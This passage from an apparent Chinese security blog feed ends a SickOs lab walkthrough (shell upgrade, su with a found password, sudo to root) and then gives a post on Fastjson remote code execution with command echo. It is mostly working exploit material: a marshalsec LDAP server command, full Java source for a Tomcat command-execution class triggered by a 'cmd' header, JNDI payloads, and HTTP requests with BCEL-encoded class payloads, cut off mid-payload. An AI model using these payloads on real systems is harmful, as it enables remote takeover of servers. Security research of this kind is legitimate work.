class="token string">'TABLE_PREFIX'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看系统存在的可登录账户：</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620535.png" alt="img"></p><p>使用python一句话获取标准shell</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">python <span class="token operator">-</span>c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620816.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620133.png" alt="img"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">www-<span class="token keyword">data</span>@SickOs:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www$ su <span class="token operator">-</span> sickossu <span class="token operator">-</span> sickosPassword: john@123sickos@SickOs:~$ <span class="token function">ls</span>     <span class="token function">ls</span>sickos@SickOs:~$ <span class="token function">cat</span> <span class="token punctuation">.</span>bash_history<span class="token function">cat</span> <span class="token punctuation">.</span>bash_historysudo su<span class="token keyword">exit</span>sickos@SickOs:~$ sudo susudo su<span class="token namespace">[sudo]</span> password <span class="token keyword">for</span> sickos: john@123root@SickOs:<span class="token operator">/</span>home/sickos<span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620364.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620177.png" alt="img"></p><p>成功获取到Flag；</p><p>若有收获，就点个赞吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson回显</title>
      <link href="/2022/01/19/fastjson-hui-xian/"/>
      <url>/2022/01/19/fastjson-hui-xian/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191516424.png" alt="image-20191018154346759"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191518543.png" alt="image-20191018154515787"></p><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>1、先启动一个LDAP服务</p><pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127. 0.0.1:6666&#x2F;#Cat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、再启动http服务</p><pre class="line-numbers language-none"><code class="language-none">py -3 -m http.server --bind 127.0.0.1 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、再http服务下的目录创建一个<code>XXX.java</code>文件 然后<code>Javac XXX.java</code> 文件内容如下：</p><pre class="line-numbers language-none"><code class="language-none">public class Cat &#123;    public Cat()throws Exception&#123;        boolean flag &#x3D; false;        ThreadGroup group &#x3D; Thread.currentThread().getThreadGroup();        java.lang.reflect.Field f &#x3D; group.getClass().getDeclaredField(&quot;threads&quot;);        f.setAccessible(true);        Thread[] threads &#x3D; (Thread[]) f.get(group);        for(int i &#x3D; 0; i &lt; threads.length; i++) &#123;            try&#123;                Thread t &#x3D; threads[i];                if (t &#x3D;&#x3D; null) continue;                String str &#x3D; t.getName();                if (str.contains(&quot;exec&quot;) || !str.contains(&quot;http&quot;)) continue;                f &#x3D; t.getClass().getDeclaredField(&quot;target&quot;);                f.setAccessible(true);                Object obj &#x3D; f.get(t);                if (!(obj instanceof Runnable)) continue;                f &#x3D; obj.getClass().getDeclaredField(&quot;this$0&quot;);                f.setAccessible(true);                obj &#x3D; f.get(obj);                try&#123;                    f &#x3D; obj.getClass().getDeclaredField(&quot;handler&quot;);                &#125;catch (NoSuchFieldException e)&#123;                    f &#x3D; obj.getClass().getSuperclass().getSuperclass().getDeclaredField(&quot;handler&quot;);                &#125;                f.setAccessible(true);                obj &#x3D; f.get(obj);                try&#123;                    f &#x3D; obj.getClass().getSuperclass().getDeclaredField(&quot;global&quot;);                &#125;catch(NoSuchFieldException e)&#123;                    f &#x3D; obj.getClass().getDeclaredField(&quot;global&quot;);                &#125;                f.setAccessible(true);                obj &#x3D; f.get(obj);                f &#x3D; obj.getClass().getDeclaredField(&quot;processors&quot;);                f.setAccessible(true);                java.util.List processors &#x3D; (java.util.List)(f.get(obj));                for(int j &#x3D; 0; j &lt; processors.size(); ++j) &#123;                    Object processor &#x3D; processors.get(j);                    f &#x3D; processor.getClass().getDeclaredField(&quot;req&quot;);                    f.setAccessible(true);                    Object req &#x3D; f.get(processor);                    Object resp &#x3D; req.getClass().getMethod(&quot;getResponse&quot;, new Class[0]).invoke(req, new Object[0]);                    str &#x3D; (String)req.getClass().getMethod(&quot;getHeader&quot;, new Class[]&#123;String.class&#125;).invoke(req, new Object[]&#123;&quot;cmd&quot;&#125;);                    if (str !&#x3D; null &amp;&amp; !str.isEmpty()) &#123;                        resp.getClass().getMethod(&quot;setStatus&quot;, new Class[]&#123;int.class&#125;).invoke(resp, new Object[]&#123;new Integer(200)&#125;);                        String[] cmds &#x3D; System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;&#x2F;c&quot;, str&#125; : new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, str&#125;;                        String charsetName &#x3D; System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? &quot;GBK&quot;:&quot;UTF-8&quot;;                        byte[] result &#x3D; (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream(),charsetName)).useDelimiter(&quot;\\A&quot;).next().getBytes(charsetName);                        try &#123;                            Class cls &#x3D; Class.forName(&quot;org.apache.tomcat.util.buf.ByteChunk&quot;);                            obj &#x3D; cls.newInstance();                            cls.getDeclaredMethod(&quot;setBytes&quot;, new Class[]&#123;byte[].class, int.class, int.class&#125;).invoke(obj, new Object[]&#123;result, new Integer(0), new Integer(result.length)&#125;);                            resp.getClass().getMethod(&quot;doWrite&quot;, new Class[]&#123;cls&#125;).invoke(resp, new Object[]&#123;obj&#125;);                        &#125; catch (NoSuchMethodException var5) &#123;                            Class cls &#x3D; Class.forName(&quot;java.nio.ByteBuffer&quot;);                            obj &#x3D; cls.getDeclaredMethod(&quot;wrap&quot;, new Class[]&#123;byte[].class&#125;).invoke(cls, new Object[]&#123;result&#125;);                            resp.getClass().getMethod(&quot;doWrite&quot;, new Class[]&#123;cls&#125;).invoke(resp, new Object[]&#123;obj&#125;);                        &#125;                        flag &#x3D; true;                    &#125;                    if (flag) break;                &#125;                if (flag)  break;            &#125;catch(Exception e)&#123;                continue;            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4、payload 直接发送</p><pre class="line-numbers language-none"><code class="language-none">&#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Cat&quot;,        &quot;autoCommit&quot;:&quot;true&quot;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、直接回显</p><hr><h2 id="基于dbcp的fastjson-rce-回显"><a href="#基于dbcp的fastjson-rce-回显" class="headerlink" title="基于dbcp的fastjson rce 回显"></a>基于dbcp的fastjson rce 回显</h2><ul><li>fastjson &lt;= 1.2.24</li><li>1.2.33 &lt;= fastjson &lt;= 1.2.47</li><li>jdk &lt;= 8u251</li><li>存在 tomcat-dbcp</li></ul><p>首先将<code>AllEcho.java</code>编译生成<code>AllEcho.class</code>文件，然后用BCELEncode 对class 文件进行bcel编码</p><ul><li>fastjson &lt;= 1.2.24 poc</li><li>解析使用的JSON.parse()</li></ul><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;json HTTP&#x2F;1.1Host: 127.0.0.1:9092Content-Type: application&#x2F;jsoncmd: ver &amp;&amp; echo fastjsonContent-Length: 3327&#123;    &#123;        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,        &quot;x&quot;:&#123;                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A&quot;        &#125;    &#125;: &quot;x&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意修改<code>Content-Type: application/json</code></p><ul><li>1.2.33 &lt;= fastjson &lt;= 1.2.47 poc</li><li>JSON.parseObject()</li><li>还需要调用toJSONString()</li><li>注意修改<code>Content-Type: application/json</code></li></ul><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;json HTTP&#x2F;1.1Host: 127.0.0.1:9092Content-Type: application&#x2F;jsoncmd: whoamiContent-Length: 3647&#123;    &quot;xx&quot;:    &#123;        &quot;@type&quot; : &quot;java.lang.Class&quot;,        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;    &#125;,    &quot;x&quot; : &#123;        &quot;name&quot;: &#123;            &quot;@type&quot; : &quot;java.lang.Class&quot;,            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;        &#125;,        &#123;            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,            &quot;c&quot;: &#123;                &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$